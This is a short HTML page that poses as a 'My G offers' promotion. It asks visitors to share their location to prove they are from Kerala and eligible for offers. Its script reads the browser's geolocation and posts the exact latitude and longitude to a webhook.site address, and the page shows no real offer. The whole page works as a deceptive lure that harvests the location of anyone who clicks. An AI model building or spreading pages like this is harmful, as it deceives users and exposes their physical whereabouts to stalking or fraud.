<!DOCTYPE html>
<html>
<head>
  <title>My G offers</title>
</head>
<body>
  <h2>Please share your location so that we can confirm that you're from Kerala and you're eligible for More Offers</h2>
  <button onclick="getLocation()">Turn on Location</button>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendPosition, showError);
      } else {
        alert("Geolocation is not supported by this browser.");
      }
    }

    function sendPosition(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      // Send location to webhook
      fetch('https://webhook.site/a6157773-9526-40c4-b268-1b8435daf8f8', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({latitude: lat, longitude: lon})
      }).then(() => {
        alert(`Location sent!\nLatitude: ${lat}\nLongitude: ${lon}`);
      }).catch(() => {
        alert('Failed to send location.');
      });
    }

    function showError(error) {
      alert('Error getting location: ' + error.message);
    }
  </script>
</body>
</html>
